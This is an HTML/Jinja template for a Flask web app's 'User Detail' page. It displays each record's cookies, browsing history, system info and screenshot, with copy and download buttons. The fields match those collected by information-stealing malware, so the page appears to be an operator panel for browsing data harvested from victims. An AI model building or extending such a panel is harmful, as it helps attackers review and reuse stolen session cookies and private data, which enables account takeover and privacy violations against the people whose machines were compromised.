<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>User Detail</title>
<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
<header>User {{ user[1] }} Details</header>
<div class="container">
    <div class="user-card">
        <p><strong>ID:</strong> {{ user[0] }}</p>
        <p><strong>Username:</strong> {{ user[1] }}</p>
        <p><strong>Timestamp:</strong> {{ user[6] }}</p>

        <h3>Cookies</h3>
        <div class="json-box">{{ user[2] }}</div>
        <button class="action-btn" onclick="copyText('{{ user[2]|escapejs }}')">Copy Cookies</button>

        <h3>History</h3>
        <div class="json-box">{{ user[3] }}</div>
        <button class="action-btn" onclick="copyText('{{ user[3]|escapejs }}')">Copy History</button>

        <h3>System Info</h3>
        <div class="json-box">{{ user[4] }}</div>
        <button class="action-btn" onclick="copyText('{{ user[4]|escapejs }}')">Copy System Info</button>

        {% if user[5] %}
        <h3>Screenshot</h3>
        <img src="data:image/png;base64,{{ user[5]|b64encode }}" class="screenshot" id="screenshot">
        <button class="action-btn" onclick="downloadImage('{{ user[5]|b64encode }}', 'screenshot.png')">Download Screenshot</button>
        {% endif %}
    </div>
</div>

<div id="modal" class="modal">
  <span class="close-modal">&times;</span>
  <img class="modal-content" id="modal-img">
</div>

<script>
const modal = document.getElementById("modal");
const img = document.getElementById("screenshot");
const modalImg = document.getElementById("modal-img");
const span = document.getElementsByClassName("close-modal")[0];

if(img){
    img.onclick = function(){
        modal.style.display = "block";
        modalImg.src = this.src;
    }
}
span.onclick = function() { modal.style.display = "none"; }
window.onclick = function(event) { if(event.target == modal){ modal.style.display = "none"; } }

function copyText(text){
    navigator.clipboard.writeText(text).then(()=>alert("Copied to clipboard!"));
}

function downloadImage(base64, filename){
    const link = document.createElement('a');
    link.href = "data:image/png;base64," + base64;
    link.download = filename;
    link.click();
}
</script>
</body>
</html>
